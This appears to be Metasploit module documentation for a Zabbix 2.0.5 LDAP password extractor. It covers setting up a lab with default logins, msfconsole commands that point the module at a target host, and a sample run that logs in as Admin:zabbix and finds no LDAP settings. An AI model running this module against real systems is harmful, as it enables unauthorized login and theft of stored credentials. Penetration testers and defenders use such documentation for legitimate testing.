
## Vulnerable Application

  Download [Zabbix 2.0.5](https://sourceforge.net/projects/zabbix/files/ZABBIX%20Latest%20Stable/2.0.5/) from Sourceforge, the main Zabbix site doesn't have a download link.
  The .iso login is root:zabbix, and the default Zabbix frontend login is Admin:zabbix ([section 2](http://zabbix.com/documentation/2.0/manual/appliance))
  Configure Zabbix:
    1. Login to the zabbix web client
    2. Click Administration, Authentication, select LDAP
    3. Fill in the fields:

## Verification Steps

  Example steps in this format:

  1. Install the application
  2. Start msfconsole
  3. Do: ```use auxiliary/admin/http/zabbix_ldap_password_extractor```
  4. Do: ```set rhost```
  5. Do: ```run```
  6. Check out the credentials

## Scenarios

When the values are all blank, but login is success:

```
resource (zabbix.rc)> use auxiliary/admin/http/zabbix_ldap_password_extractor
resource (zabbix.rc)> set rhost 192.168.2.245
rhost => 192.168.2.245
resource (zabbix.rc)> set verbose true
verbose => true
resource (zabbix.rc)> run
[*] Attempting Login: Admin:zabbix
[*] Login Success
[*] No LDAP Host Found
[*] No LDAP Bind Domain Found
[*] No LDAP Bind Password Found
[*] No Login (user) found
[*] Auxiliary module execution completed
```
